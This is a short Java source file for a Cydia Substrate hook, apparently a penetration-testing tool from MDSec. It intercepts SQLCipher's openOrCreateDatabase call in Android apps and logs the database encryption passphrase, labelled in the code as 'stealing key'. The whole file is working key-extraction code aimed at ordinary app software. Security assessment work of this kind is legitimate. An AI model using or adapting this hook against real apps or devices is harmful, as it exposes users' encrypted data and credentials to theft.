package com.mdsec.keyhooker;
import com.saurik.substrate.MS;
import java.lang.reflect.Method;
import java.io.File;
import net.sqlcipher.database.SQLiteDatabase;
import android.util.Log;

public class Main {

	static void hookCryptoKey() {
		MS.hookClassLoad("net.sqlcipher.database.SQLiteDatabase",
					new MS.ClassLoadHook() {
						public void classLoaded(Class<?> arg0) {
							Log.d("MDSecHook", "##### Class Loaded\n");

							Method openOrCreateDatabase;
							try {
								openOrCreateDatabase = arg0.getMethod(
										"openOrCreateDatabase",
										new Class[] { File.class, String.class, SQLiteDatabase.CursorFactory.class });

							} catch (NoSuchMethodException e) {
								openOrCreateDatabase = null;
								Log.d("MDSecHook",
										"##### Unable to find method\n");
							}

							if (openOrCreateDatabase != null) {
								Log.d("MDSecHook", "##### Found method\n");
								try {
									final MS.MethodPointer old = new MS.MethodPointer();
									MS.hookMethod(arg0,
											openOrCreateDatabase,
											new MS.MethodHook() {
												public Object invoked(Object arg0,
														Object... args)
														throws Throwable {
													Log.d("MDSecHook", "##### Error: " + Thread.currentThread().getStackTrace());
													Log.d("MDSecHook",
															"###### Method hooked, stealing key: " + args[1]);

													return old.invoke(arg0, args);
												}
											}, old);
								} catch (Exception e) {
									System.out
											.println("#### Unable to find class\n");
								}
							}

						}
					});

		}

	static void initialize() { 
		hookCryptoKey();
		
    }
	
}
